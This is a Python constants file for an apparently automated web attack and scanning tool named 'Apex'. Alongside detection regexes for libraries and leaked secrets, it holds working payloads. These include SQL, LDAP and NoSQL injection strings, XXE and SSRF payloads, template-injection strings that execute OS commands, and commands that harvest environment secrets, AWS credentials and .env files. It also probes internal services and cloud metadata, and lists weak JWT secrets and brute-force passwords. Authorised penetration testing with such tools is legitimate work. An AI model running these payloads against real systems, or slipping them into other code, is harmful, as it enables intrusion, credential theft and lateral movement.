"""Static runtime patterns and probe constants for Apex."""

from __future__ import annotations

import re
import urllib.parse

from typing import Dict, List, Tuple

_TERMINAL_ARTIFACTS: frozenset = frozenset({
    "CODE_EXEC",
    "CLOUD_CREDS",
    "ACCOUNT_TAKEOVER",
    "ADMIN_SESSION",
    "DB_ACCESS",
    "SOURCE_CODE",
    "FILE_READ_ARBITRARY",
    "INTERNAL_NETWORK",
    "MASS_DATA_EXFIL",
    "PERSISTENT_XSS",
    "SIGNING_KEY",
})

_INTERMEDIATE_ARTIFACTS: frozenset = frozenset({
    "CREDENTIALS",
    "SESSION_TOKEN",
    "SSRF_PRIMITIVE",
    "FILE_READ_LIMITED",
    "INTERNAL_STATE",
    "TEMPLATE_EXEC",
    "DNS_CONTROL",
    "DESERIALIZATION_EXEC",
    "STORED_PAYLOAD",
    "SCHEMA_KNOWLEDGE",
    "NETWORK_TOPOLOGY",
    "PARTIAL_SOURCE",
    "CRYPTO_MATERIAL",
    "AUTH_CONFUSION",
    "PARAM_CONTROL",
})

_JS_LIB_URL_PATTERNS: List[Tuple[str, "re.Pattern[str]"]] = [
    ("jquery-ui",   re.compile(r"jquery[-.]ui[-.]?(?:bundle|all|core|widget)?[-.]?(\d+\.\d+\.\d+)", re.I)),
    ("jquery",      re.compile(r"(?:^|/)jquery[-.]?(\d+\.\d+\.\d+)(?:\.slim)?(?:\.min)?\.js", re.I)),
    ("angularjs",   re.compile(r"(?:^|/)angular(?:js)?[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("lodash",      re.compile(r"(?:^|/)lodash(?:\.fp)?[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("moment",      re.compile(r"(?:^|/)moment(?:-with-locales)?[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("bootstrap",   re.compile(r"(?:^|/)bootstrap(?:\.bundle)?[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("handlebars",  re.compile(r"(?:^|/)handlebars(?:\.runtime)?[-.]?v?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("ckeditor",    re.compile(r"ckeditor[/-](\d+\.\d+\.\d+)", re.I)),
    ("tinymce",     re.compile(r"tinymce[/-](\d+\.\d+\.\d+)", re.I)),
    ("vue",         re.compile(r"(?:^|/)vue[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("ember",       re.compile(r"(?:^|/)ember[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("knockout",    re.compile(r"(?:^|/)knockout[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("prototype",   re.compile(r"(?:^|/)prototype[-.]?(\d+\.\d+\.\d+)?", re.I)),
    ("mustache",    re.compile(r"(?:^|/)mustache[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("underscore",  re.compile(r"(?:^|/)underscore[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("dompurify",   re.compile(r"(?:^|/)(?:dom)?purify[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("marked",      re.compile(r"(?:^|/)marked[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("axios",       re.compile(r"(?:^|/)axios[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
    ("swagger-ui",  re.compile(r"swagger-ui[/-](\d+\.\d+\.\d+)", re.I)),
    ("select2",     re.compile(r"(?:^|/)select2[-.]?(\d+\.\d+\.\d+)(?:\.min)?\.js", re.I)),
]

_JS_LIB_SOURCE_PATTERNS: List[Tuple[str, "re.Pattern[str]"]] = [
    ("jquery-ui",   re.compile(r"jQuery UI\s*-?\s*v?(\d+\.\d+\.\d+)", re.I)),
    ("jquery",      re.compile(r"jQuery\s+(?:JavaScript\s+Library\s+)?v?(\d+\.\d+\.\d+)", re.I)),
    ("angularjs",   re.compile(r"AngularJS\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("lodash",      re.compile(r"lodash\s+<https?://[^>]+>\s+Copyright[^v]+v?(\d+\.\d+\.\d+)", re.I)),
    ("lodash",      re.compile(r"@license\s+lodash\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("moment",      re.compile(r"moment\.js\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("bootstrap",   re.compile(r"Bootstrap\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("handlebars",  re.compile(r"Handlebars\.?(?:js)?\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("ckeditor",    re.compile(r"CKEditor\s+(\d+\.\d+\.\d+)", re.I)),
    ("tinymce",     re.compile(r"TinyMCE\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("vue",         re.compile(r"Vue\.js\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("ember",       re.compile(r"Ember\s+(?:-?\s*)?v?(\d+\.\d+\.\d+)", re.I)),
    ("knockout",    re.compile(r"Knockout\s*JavaScript\s*library\s*v?(\d+\.\d+\.\d+)", re.I)),
    ("prototype",   re.compile(r"Prototype\s+JavaScript\s+framework,?\s+version\s+(\d+\.\d+\.\d+)", re.I)),
    ("mustache",    re.compile(r"mustache\.js\s+-?\s*v?(\d+\.\d+\.\d+)", re.I)),
    ("underscore",  re.compile(r"Underscore\.js\s+(\d+\.\d+\.\d+)", re.I)),
    ("dompurify",   re.compile(r"DOMPurify\s+(\d+\.\d+\.\d+)", re.I)),
    ("marked",      re.compile(r"marked\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("axios",       re.compile(r"axios/(\d+\.\d+\.\d+)", re.I)),
    ("swagger-ui",  re.compile(r"swagger-ui\s+v?(\d+\.\d+\.\d+)", re.I)),
    ("select2",     re.compile(r"Select2\s+(\d+\.\d+\.\d+)", re.I)),
    ("yui",         re.compile(r"YUI\s+(\d+\.\d+\.\d+)", re.I)),
]

_DB_FINGERPRINTS: List[Tuple[re.Pattern, str]] = [
    (re.compile(r"sql syntax.*mysql|mysql_fetch|warning.*mysql|mysqli_|you have an error in your sql syntax", re.I), "MySQL"),
    (re.compile(r"unclosed quotation mark|odbc sql server|microsoft ole db|mssql_|incorrect syntax near", re.I), "MSSQL"),
    (re.compile(r"postgresql query failed|pg_query\(\)|pg_exec\(\)|unterminated quoted|error:.*syntax error at or near", re.I), "PostgreSQL"),
    (re.compile(r"ora-\d{5}|oracle.*error|pl/sql.*error", re.I), "Oracle"),
    (re.compile(r"sqlite3\.operationalerror|sqlite_exception|sqlite error", re.I), "SQLite"),
    (re.compile(r"sqlstate\[", re.I), "PDO (DB unknown)"),
]

_TIME_PAYLOADS: List[Tuple[str, float]] = [
    ("1' AND SLEEP(1)--",          1.0),
    ("1;SELECT pg_sleep(1)--",     1.0),
    ("1' WAITFOR DELAY '0:0:1'--", 1.0),
    ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',1)--", 1.0),
    ("1' AND (SELECT * FROM (SELECT SLEEP(1))a)--",  1.0),
]

_LFI_CONFIRM_RE = re.compile(
    r"root:x:0:0|root:.*:/bin/|nobody:.*:/|bin:.*:/bin|PD9waHA|"
    r"\[extensions\].*fonts|\[boot loader\]|for 16-bit app support",
    re.I | re.S,
)

_OPEN_REDIRECT_PARAMS = [
    "url", "next", "redirect", "return", "returnUrl", "goto",
    "dest", "target", "r", "u", "redirect_uri", "callback",
    "continue", "redir", "out", "view", "image_url", "file_url",
    "data", "ref", "forward", "location", "link", "to", "from",
    "action", "checkout_url", "success_url", "cancel_url",
]

_SECURITY_HEADERS = [
    "strict-transport-security",
    "content-security-policy",
    "x-frame-options",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
]

_LDAP_ERRORS = [
    r"ldaperr",
    r"javax\.naming\.directory",
    r"invalid search filter",
    r"ldap_search",
    r"com\.sun\.jndi\.ldap",
]

_LDAP_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "admin)(&(password=*))",
    "*)(objectClass=*",
]

_SSRF_PAYLOADS = [
    "http://127.0.0.1:80/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::ffff:127.0.0.1]/",
    "dict://127.0.0.1:80/",
    "gopher://127.0.0.1:80/_",
    "file:///etc/passwd",
]

_SECRET_PATTERNS = [
    (re.compile(r"AKIA[0-9A-Z]{16}"),                                "AWS access key id"),
    (re.compile(r"ASIA[0-9A-Z]{16}"),                                "AWS temporary access key"),
    (re.compile(r"sk_(?:live|test)_[0-9a-zA-Z]{20,}"),              "Stripe secret key"),
    (re.compile(r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----"), "PEM private key"),
    (re.compile(r"gh[pso]_[0-9a-zA-Z]{36}"),                        "GitHub PAT/OAuth token"),
    (re.compile(r"gh[opu]_[0-9a-zA-Z]{36}"),                        "GitHub token"),
    (re.compile(r"xox[baprs]-[0-9A-Za-z-]{10,}"),                   "Slack token"),
    (re.compile(r"https://hooks\.slack\.com/services/[A-Z0-9/]{20,}"), "Slack webhook URL"),
    (re.compile(r"AIza[0-9A-Za-z\-_]{35}"),                          "Google API key"),
    (re.compile(r"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}"), "JWT token"),
    (re.compile(r"[Pp]assword\s*[:=]\s*['\"]?[^\s'\"]{8,}"),        "Plaintext password"),
    (re.compile(r"AWSSessionToken[\"']?\s*[:=]"),                    "AWS session token"),
    (re.compile(r"(?:^|[^A-Za-z])AC[a-f0-9]{32}(?:[^A-Za-z]|$)"),  "Twilio auth SID"),
    (re.compile(r"Bot\s+[A-Za-z0-9._\-]{59}"),                      "Discord bot token"),
]

_PROTO_PAYLOADS = [
    "__proto__[test]=polluted",
    "constructor[prototype][test]=polluted",
    "__proto__.test=polluted",
]

_OPENAPI_JSON_PATHS = [
    "/openapi.json",
    "/v3/api-docs",
    "/api/openapi.json",
    "/swagger-resources/configuration/ui",
    "/api/swagger.json",
]

_S3_PATTERN = re.compile(
    r"(?:https?://)?([a-z0-9][a-z0-9\-]{2,62})\.s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com|"
    r"storage\.googleapis\.com/([a-z0-9][a-z0-9\-_]{2,62})|"
    r"([a-z0-9][a-z0-9\-]{2,62})\.blob\.core\.windows\.net",
    re.I,
)

_HTML_COMMENT_SENSITIVE = re.compile(
    r"password|passwd|secret|api[_. -]?key|token|todo|fixme|hack|debug|admin|"
    r"credentials?|private|internal|staging|dev[_. -]?only|remove\s+before|"
    r"do\s+not\s+commit|backdoor|test\s+account|auth|bearer|access[_. -]?key",
    re.I,
)

_DESER_RESPONSES = re.compile(
    r"unserialize|deserialization|invalid.*serial|corrupt.*serial|"
    r"O:\d+:|ClassNotFoundException|java\.io\.ObjectInputStream|"
    r"pickle\.loads|yaml\.load|Marshal\.load|gadget|ysoserial",
    re.I,
)

_LOGIN_PATHS = [
    "/login", "/signin", "/sign-in", "/auth", "/authenticate",
    "/wp-login.php", "/admin/login", "/user/login", "/account/login",
    "/session/new", "/users/sign_in",
]

_STRONG_FINDING_RE = re.compile(
    r"\b("
    r"callback received|oob callback|retrieved|written and retrieved|canary written|"
    r"executed|server executed|evaluated|accepted without authentication|accessible without auth|"
    r"without authentication|unauthenticated read|unauthenticated write|readable without auth|"
    r"private key|credentials exposed|secret credentials|iam credentials|root:.*:0:0|/etc/passwd|"
    r"local file read|local file contents|file read|body-reflected|reflected in response|"
    r"reflected in location|reflected in header|token issued|admin:true|privileged response|"
    r"bypasses auth|auth bypass|signature verification bypassed|accepted and reflected|"
    r"true_len|false_len|boolean-blind|error-based|headless browser|zone transfer|axfr|"
    r"anonymous login accepted|info command accessible|stats command accepted|mutation .* succeeded|"
    r"returned privileged|same authenticated response|metadata reached|cloud metadata|jndi|"
    r"stored/persistent|payload stored|cache serves same authenticated response"
    r")\b",
    re.I,
)

_WEAK_FINDING_RE = re.compile(
    r"\b("
    r"possible|potential|candidate|surface|fingerprint|banner|version|vulnerable range|"
    r"detected|appears|advertises|suggest|suggesting|may|might|could|verify patched|"
    r"check manually|cross-testing recommended|outdated|older|missing|lacks|not set|"
    r"no .*header|does not|informational|enumeration|discovered|reachable|exposed"
    r")\b",
    re.I,
)

_LOW_CONFIDENCE_MODULE_RE = re.compile(
    r"(fingerprint|cve|headers|policy|waf|technology|surface|enumeration|robots|sitemap|"
    r"security\.txt|manifest|referrer|permissions|reporting|deploy freshness|stack coherence|"
    r"ct log|dns caa|subdomain)",
    re.I,
)

_EXACT_EVIDENCE_RE = re.compile(
    r"("
    r"root:x:0:0|root:.*:0:0|\betc/passwd\b|\bwin\.ini\b|uid=\d+|gid=\d+|"
    r"AKIA[0-9A-Z]{16}|-----BEGIN (?:RSA |EC )?PRIVATE KEY-----|"
    r"true_len=\d+|false_len=\d+|baseline_len=\d+|true_payload=|false_payload=|"
    r"canary\s+(?:written|retrieved|found)|marker\s+found|payload\s+stored|"
    r"oob\s+callback|callback\s+(?:received|from)|jndi|ldap://|rmi://|dns callback|"
    r"alg:none accepted|signature verification bypassed|admin\s*[:=]\s*true|"
    r"accepted and reflected|reflected/executed|body-reflected|status\s*change|"
    r"hardcoded credential-like|browser storage used for sensitive key|sensitive-looking key (?:found|present)|"
    r"exposes symmetric key material|private key component|public jwks contains oct symmetric key|"
    r"wildcard cors|without vary: origin|authorization response issued without state|"
    r"returned\s+(?:200|201|204)|HTTP\s+(?:200|201|204)|RCODE=0|AXFR|"
    r"anonymous login accepted|INFO command accessible|stats command accepted|"
    r"mutation .* succeeded|server executed|template expression .* evaluated"
    r")",
    re.I,
)

_PROOF_PAIR_RE = re.compile(
    r"(true.*false|baseline.*(?:delta|diff)|same authenticated response|without authentication.*(?:credentials|user|admin|secret|token|privileged)|"
    r"(?:403|401).*(?:200|201|204)|(?:200|201|204).*(?:403|401)|reproduction|\d+/\d+)",
    re.I,
)

_BCM_VALUE_CLASSES: Dict[str, List[str]] = {
    "NUMERIC":   ["0", "1", "2", "-1", "99999"],
    "ALPHA":     ["a", "admin", "user", "guest", "test"],
    "BOOL":      ["true", "false", "null"],
    "BOUNDARY":  ["", " ", "%00", "undefined", "NaN"],
    "STRUCTURE": ["{}", "[]", "<>", "''", '""'],
}

_AM_POS_RE = re.compile(
    r"balance|count|credit|quantity|amount|score|total|budget|quota"
    r"|price|cost|fee|limit|remaining|available|usage|tokens|points|allowance",
    re.I,
)

_CSP_SEC_PARAMS = frozenset({
    "id", "user_id", "userid", "uid", "user", "account", "account_id",
    "role", "admin", "privilege", "access", "token", "key", "api_key",
    "group", "org", "org_id", "tenant", "owner", "owner_id",
})

_AIF_NONCE_RE     = re.compile(
    r'"[a-f0-9]{32,}"'
    r'|(?:(?:iat|exp|nbf|jti|nonce|csrf|_token|requestid|x-request-id)'
    r'\s*[":=]\s*["\']?[A-Za-z0-9_.+/\-]{8,}["\']?)',
    re.I,
)

_DAGE_ID_FIELD_RE = re.compile(
    r'"(?:[a-z][a-z0-9]*(?:_id|Id|ID)s?'
    r'|id|uid|uuid|owner|parent_id|parentId)"'
    r'\s*:\s*(?P<val>\d{1,15}|"[0-9a-f\-]{8,36}")',
    re.I,
)

_DAGE_HREF_RE        = re.compile(
    r'"(?:href|url|self|link|canonical|location)"\s*:\s*'
    r'"(https?://[^"]{5,200}|/[a-z0-9_/\-]{3,200})"',
    re.I,
)

_DAGE_NONCE_RE       = re.compile(
    r'"[a-f0-9]{32,}"'
    r'|(?:(?:iat|exp|nbf|jti|nonce|csrf|_token|requestid)\s*[":=]\s*["\']?'
    r'[A-Za-z0-9_.+/\-]{8,}["\']?)',
    re.I,
)

_DAGE_SENSITIVE_RTYPES = frozenset((
    "user", "users", "account", "accounts", "tenant", "tenants",
    "org", "orgs", "organisation", "organisations", "organization", "organizations",
    "profile", "profiles", "document", "documents", "doc", "docs",
    "file", "files", "record", "records", "order", "orders",
    "invoice", "invoices", "payment", "payments",
    "credential", "credentials", "secret", "secrets",
    "key", "keys", "config", "configs",
))

_RACE_KEYWORD_RE = re.compile(
    r"(?:redeem|coupon|voucher|discount|promo|checkout|purchase|buy|order"
    r"|payment|transfer|withdraw|deposit|apply|use|claim|activate|enroll"
    r"|register|vote|subscribe|confirm|verify|upgrade|consume"
    r"|debit|spend|burn|allocate|book|reserve|refund|charge)",
    re.I,
)

_RACE_VALUE_RE = re.compile(
    r'"(?:price|amount|qty|quantity|balance|count|total|cost|credit|stock'
    r'|limit|budget|units|points|tokens|credits|remaining|quota|uses|left'
    r'|available|capacity|seats|slots|inventory)"'
    r'\s*:\s*(-?\d+(?:\.\d+)?)',
    re.I,
)

_RACE_ERROR_RE = re.compile(
    r"already\s+(?:used|redeemed|applied|claimed|consumed|spent)"
    r"|insufficient\s+(?:funds|stock|balance|credit|quota|inventory)"
    r"|limit\s+(?:exceeded|reached|exhausted)"
    r"|(?:maximum|max)\s+(?:uses|redemptions|attempts)\s+(?:reached|exceeded)"
    r"|duplicate\s+(?:entry|key|transaction|request|order)"
    r"|optimistic\s+lock(?:ing)?"
    r"|deadlock\s+(?:found|detected)"
    r"|transaction\s+(?:conflict|aborted|rolled\s*back)"
    r"|concurrent\s+modification"
    r"|stale\s+(?:data|state|object)"
    r"|version\s+conflict"
    r"|etag\s+mismatch",
    re.I,
)

_RACE_FORM_ACTION_RE = re.compile(
    r'<form\b[^>]*action=["\']([^"\']+)["\'][^>]*method=["\'](\w+)["\']'
    r'|<form\b[^>]*method=["\'](\w+)["\'][^>]*action=["\']([^"\']+)["\']',
    re.I,
)

_SSTI_SYNTAXES: List[Tuple[str, str, str, str]] = [
    ("jinja2_twig",   "{{%s}}",    "1337*1337", "1787569"),
    ("el_freemarker", "${%s}",     "1337*1337", "1787569"),
    ("erb_ejs",       "<%%= %s %%>", "1337*1337", "1787569"),
    ("slim_haml",     "#{%s}",     "1337*1337", "1787569"),
    ("thymeleaf",     "*{%s}",     "1337*1337", "1787569"),
    ("smarty",        "{%s}",      "1337*1337", "1787569"),
    ("pebble",        "{{%s}}",    "1337*1337", "1787569"),
]

_SSTI_BLIND_TIMING: List[Tuple[str, str, str]] = [
    ("jinja2_twig",   "{{range(99999)|list|length}}", "{{1}}"),
    ("el_freemarker", "${(1..99999)?size}",            "${1}"),
    ("erb",           "<%= (1..99999).to_a.size %>",   "<%= 1 %>"),
]

_SSTI_ERR_EXFIL: Dict[str, str] = {
    "jinja2":        "{{lipsum.__globals__['os'].popen('%s').read()|int}}",
    "jinja2_config": "{{config.__class__.__init__.__globals__['os'].popen('%s').read()|int}}",
    "jinja2_cycler": "{{cycler.__init__.__globals__.os.popen('%s').read()|int}}",
    "freemarker":    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("%s")?number}',
}

_SSTI_J2_SUBCLASS_TARGETS = [
    "subprocess.Popen", "Popen",
    "os._wrap_close",   "_wrap_close",
    "BufferedRandom",
]

_SSTI_WAF_BYPASS: List[Tuple[str, str]] = [
    ("{%set x=7*7%}{{x}}",              "set_variable"),
    ("{{''.join(['4','9'])}}",           "string_join"),
    ("{{(7).__mul__(7)}}",              "method_call"),
    ("{{'%s'|format(7*7)}}",            "format_filter"),
    ("%7B%7B7*7%7D%7D",                 "url_encoded"),
]

_SSTI_SECRET_CMD = (
    "env 2>/dev/null | grep -iE "
    "'KEY|SECRET|TOKEN|PASS|DB_|DATABASE|REDIS|AWS|AZURE|GCP|API_|PRIVATE"
    "|CRED|AUTH|JWT|SALT|STRIPE|TWILIO|WEBHOOK' | head -30"
)

_SSTI_EXFIL_FILES = [
    "cat /etc/passwd",
    "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'KEY|SECRET|PASS|TOKEN' | head -20",
    "cat ~/.aws/credentials 2>/dev/null",
    "cat /app/.env 2>/dev/null || cat /.env 2>/dev/null",
    "cat /proc/version 2>/dev/null",
    "cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '",
]

_SSTI_PIVOT_PROBES: List[Tuple[str, str]] = [
    ("Redis",      "curl -s --max-time 2 http://localhost:6379/ 2>&1 | head -3"),
    ("IMDS-AWS",   "curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null"),
    ("IMDS-GCP",   "curl -s --max-time 2 -H 'Metadata-Flavor: Google' "
                   "http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null"),
    ("Docker-API", "curl -s --max-time 2 http://localhost:2375/info 2>/dev/null | head -3"),
    ("K8s-API",    "curl -s --max-time 2 -k https://kubernetes.default.svc/api/ 2>/dev/null | head -3"),
]

_SSTI_COMMON_PARAMS = [
    "q", "s", "search", "query", "name", "user", "input", "text",
    "template", "lang", "msg", "message", "content", "title",
    "description", "keyword", "value", "render", "view", "format",
    "subject", "body", "to", "from", "url", "redirect", "page",
    "data", "key", "cmd", "output", "result", "layout", "theme",
]

_SSTI_BYPASS_FMTS: List[str] = [
    "%s",
    urllib.parse.quote("%s"),
    "%s".replace("{", "%7b").replace("}", "%7d"),
]

_CP_CACHE_HEADERS = [
    "X-Cache", "Cf-Cache-Status", "X-Cache-Status", "X-Served-By",
    "X-Cache-Hits", "X-Varnish", "Age", "Via", "X-Fastly-Request-ID",
    "CDN-Cache-Control", "Surrogate-Control", "X-CDN",
    "X-Cache-Lookup", "X-Cache-Age",
]

_GQL_PATHS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
    "/gql", "/query", "/api/query", "/graphiql", "/playground",
    "/__graphql", "/api/v1/graphql", "/app/graphql", "/data",
    "/graphql/v1", "/graph", "/api/graph",
]

_GQL_INTROSPECT_Q = (
    '{"query":"{__schema{queryType{name}mutationType{name}'
    'types{name kind fields(includeDeprecated:true)'
    '{name type{name kind ofType{name kind}}}}}}"}'
)

_GQL_SENSITIVE_MUTATIONS = [
    "createUser", "deleteUser", "updateUser", "registerUser",
    "updateRole", "setAdmin", "grantPermission", "revokePermission",
    "updatePassword", "changePassword", "resetPassword",
    "createToken", "deleteToken", "impersonate",
    "deleteAccount", "disableAccount", "promoteUser",
]

_GQL_SENSITIVE_QUERIES = [
    "users", "allUsers", "user", "me", "viewer",
    "admin", "admins", "tokens", "apiKeys", "secrets",
    "credentials", "config", "systemConfig", "privateKey",
]

_GQL_BF_PASSES = [
    "password", "123456", "admin123", "Password1", "test123",
    "letmein", "welcome1", "qwerty", "pass123", "default",
    "root", "secret", "dragon", "sunshine", "admin",
    "monkey", "iloveyou", "login", "access", "trustno1",
]

_XXE_PATHS = [
    "/ws", "/service", "/soap", "/api/soap", "/wsdl",
    "/xmlrpc", "/rpc", "/xml", "/api/xml",
    "/upload", "/import", "/parse", "/convert",
    "/feed", "/rss", "/atom", "/sitemap.xml",
    "/api/v1/import", "/api/upload", "/api/parse",
]

_XXE_CLASSIC_PL = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<root><data>&xxe;</data></root>'
)

_XXE_WIN_PL = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
    '<root><data>&xxe;</data></root>'
)

_XXE_HOSTNAME_PL = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
    '<root><data>&xxe;</data></root>'
)

_XXE_SSRF_PL = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
    '<root><data>&ssrf;</data></root>'
)

_XXE_XINCLUDE_PL = (
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
    '<xi:include parse="text" href="file:///etc/passwd"/>'
    '</foo>'
)

_XXE_SVG_PL = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<text y="20">&xxe;</text>'
    '</svg>'
)

_XXE_LOL_PL = (
    '<?xml version="1.0"?><!DOCTYPE lolz ['
    '<!ENTITY a0 "dosdosdosdosdos">'
    '<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">'
    '<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">'
    '<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;">'
    ']><root>&a3;</root>'
)

_XXE_SOAP_WRAP = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
    '<soapenv:Body>%s</soapenv:Body>'
    '</soapenv:Envelope>'
)

_PP_JSON_PROBES: List[Tuple[str, str]] = [
    ('{"__proto__":{"%s":"%s"}}',       "__proto__"),
    ('{"constructor":{"prototype":{"%s":"%s"}}}', "constructor.prototype"),
    ('{"__proto__.__proto__":{"%s":"%s"}}', "__proto__.__proto__"),
]

_TOK_JWT_WEAK_SECRETS: List[str] = [
    "", "secret", "password", "123456", "admin", "test", "jwt",
    "key", "default", "changeme", "supersecret", "s3cr3t", "qwerty",
    "abc123", "letmein", "master", "pass", "mykey", "privatekey",
    "signingkey", "authsecret", "jwtsecret", "jwt_secret", "app_secret",
    "flask-unsign", "django-insecure-", "your-256-bit-secret",
    "your-secret-key", "mysecretkey", "secretkey", "auth", "secure",
    "development", "production", "staging", "token_secret",
]

_LING_PRIV_CLUSTERS: Dict[str, List[str]] = {
    "admin":      ["admin", "is_admin", "administrator", "superuser", "staff", "is_staff", "root", "sudo"],
    "role":       ["role", "roles", "user_role", "account_role", "user_type", "account_type", "level", "tier", "group"],
    "premium":    ["premium", "is_premium", "pro", "is_pro", "paid", "subscription", "plan", "vip", "enterprise"],
    "verified":   ["verified", "is_verified", "confirmed", "activated", "active", "is_active", "enabled", "approved"],
    "permission": ["permission", "permissions", "perms", "scope", "scopes", "grant", "privilege", "rights"],
    "debug":      ["debug", "is_debug", "dev", "development", "test", "testing", "sandbox", "internal", "beta"],
}

_XSS_EXEC_PROBES = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
]

_XSS_DEFAULT_PARAMS = [
    "q", "search", "id", "name", "query", "term", "keyword", "msg",
    "comment", "title", "content", "text", "description", "body",
    "subject", "message", "value", "input", "data",
]

_NOSQL_JSON_PAYLOADS = [
    {"$gt": ""},
    {"$ne": "invalid_xyz_nosql"},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$exists": True},
    {"$nin": ["impossible_value_xyz"]},
]

_NOSQL_URL_BYPASS = [
    "1'||'1'=='1",
    "' || 1==1//",
    "'; return true; //",
    "[$ne]=invalid",
    "[$gt]=",
    "[$regex]=.*",
]

_MIXED_CONTENT_PATTERNS: List[Tuple["re.Pattern[str]", str]] = [
    (re.compile(r'<script[^>]+src=["\'](http://[^"\']+)["\']', re.I), "script src"),
    (re.compile(r'<link[^>]+href=["\'](http://[^"\']+\.(?:css|js))["\']', re.I), "stylesheet href"),
    (re.compile(r'<img[^>]+src=["\'](http://[^"\']+)["\']', re.I), "image src"),
    (re.compile(r'<iframe[^>]+src=["\'](http://[^"\']+)["\']', re.I), "iframe src"),
    (re.compile(r'<form[^>]+action=["\'](http://[^"\']+)["\']', re.I), "form action"),
]

_JWT_COMMON_SECRETS = [
    "secret", "password", "123456", "key", "jwt_secret", "your-256-bit-secret",
    "mysecret", "secretkey", "change_me", "admin", "test", "supersecret",
    "1234567890", "qwerty", "letmein", "welcome", "dragon", "master", "pass",
    "abc123", "root", "toor", "hack", "password123", "12345678", "default",
    "development", "production", "staging", "signingkey", "mykey", "jwtkey",
    "jwtsecret", "dev", "api_secret", "app_secret", "flask_secret", "django-insecure",
    "supersecretkey", "changethis", "youshallnotpass", "insecure", "unsafe",
]

_POLYGLOT_PAYLOAD = (
    "'\"><svg/onload=alert(1)>"
    "' OR 1=1-- "
    "{{7*7}}"
    "${7*7}"
    ";echo CMDI;"
    "....//....//etc/passwd"
)

_JS_PASSTHROUGH_FNS: frozenset = frozenset({
    "toString", "valueOf", "trim", "toLowerCase", "toUpperCase", "replace",
    "slice", "substring", "split", "concat", "encodeURIComponent",
    "decodeURIComponent", "JSON.stringify", "String", "Array.from",
    "Object.assign", "Object.values", "Object.keys",
})

_JS_POSTMSG_LISTENER_RE = re.compile(
    r'addEventListener\s*\(\s*[\'"]message[\'"]\s*,\s*'
    r'(?:async\s*)?(?:function\s*)?\(?\s*([A-Za-z_$][\w$]*)',
    re.MULTILINE,
)

_JS_FN_DEF_RE = re.compile(
    r'(?:function\s+([A-Za-z_$][\w$]*)\s*\(([^)]*)\)|'
    r'(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:async\s*)?function\s*\(([^)]*)\))',
    re.MULTILINE,
)

_JS_ARRAY_METHOD_RE = re.compile(
    r'(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*([A-Za-z_$][\w$.]*)'
    r'\s*\.\s*(?:map|filter|reduce|join|flat|flatMap)\s*\(',
    re.MULTILINE,
)

_JS_IMPORT_RE = re.compile(
    r'(?:require\s*\(\s*[\'"]([^"\']+)[\'"]\s*\)|'
    r'import\s+[^"\']*from\s+[\'"]([^"\']+)[\'"]|'
    r'import\s*\(\s*[\'"]([^"\']+)[\'"]\s*\))',
    re.MULTILINE,
)

_JS_EXPORT_RE = re.compile(
    r'(?:module\.exports\s*=\s*\{([^}]+)\}|'
    r'export\s+\{([^}]+)\}|'
    r'export\s+default\s+([A-Za-z_$][\w$]*))',
    re.MULTILINE,
)

